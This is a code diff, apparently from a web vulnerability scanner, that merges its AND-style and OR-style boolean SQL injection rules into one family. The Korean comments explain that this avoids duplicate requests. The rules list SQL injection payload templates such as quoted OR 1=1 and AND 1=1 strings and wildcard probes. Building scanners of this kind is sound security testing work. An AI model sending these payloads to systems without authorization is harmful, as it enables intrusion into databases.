@@ -38,39 +38,30 @@ SQLI_RULES: list[dict] = [
         },
     },
     {
-        "attack_id": "PL-SQLI-BOOLEAN-AND",
+        # AND/OR 스타일을 한 family로 통합 — 두 스타일이 false_attack(6개)과 와일드카드(3개)를
+        # 완전히 동일하게 공유했던 걸 그대로 두면 family당 요청이 이중으로 나가서 하나로 합침.
+        # _analyze_boolean은 true/false 방향을 이미 무관하게 처리하므로 판정 로직 변경은 불필요.
+        "attack_id": "PL-SQLI-BOOLEAN",
         "vuln_type": "sqli",
-        "technique": "boolean_and",
+        "technique": "boolean",
         "sequence": ["baseline", "true_attack", "false_attack"],
         "payload_templates": {
             "true_attack": [
+                # AND 스타일 — true≈baseline, false≠baseline로 해석되길 기대
                 "{value} AND 1=1 -- ",
                 "{value}' AND '1'='1' -- ",
                 '{value}" AND "1"="1" -- ',
                 "{value} AND 1=1",
                 "{value}' AND '1'='1",
                 '{value}" AND "1"="1"',
-                "{value}%",
-                "{value}%' -- ",
-                '{value}%" -- ',
-            ],
-            "false_attack": _BOOLEAN_AND_FALSE_TEMPLATES,
-        },
-    },
-    {
-        "attack_id": "PL-SQLI-BOOLEAN-OR",
-        "vuln_type": "sqli",
-        "technique": "boolean_or",
-        "sequence": ["baseline", "true_attack", "false_attack"],
-        "payload_templates": {
-            # OR-true vs AND-false 비교 — AND로 차이가 안 보일 때 조건 범위를 넓혀 재확인
-            "true_attack": [
+                # OR 스타일 — AND로 차이가 안 보일 때 조건 범위를 넓혀 재확인 (방향 반대)
                 "{value} OR 1=1 -- ",
                 "{value}' OR '1'='1' -- ",
                 '{value}" OR "1"="1" -- ',
                 "{value} OR 1=1",
                 "{value}' OR '1'='1",
                 '{value}" OR "1"="1"',
+                # 와일드카드 — AND/OR 스타일 둘 다에서 통했던 것이라 스타일 무관 공통 확인용으로 1벌만 유지
                 "{value}%",
                 "{value}%' -- ",
                 '{value}%" -- ',
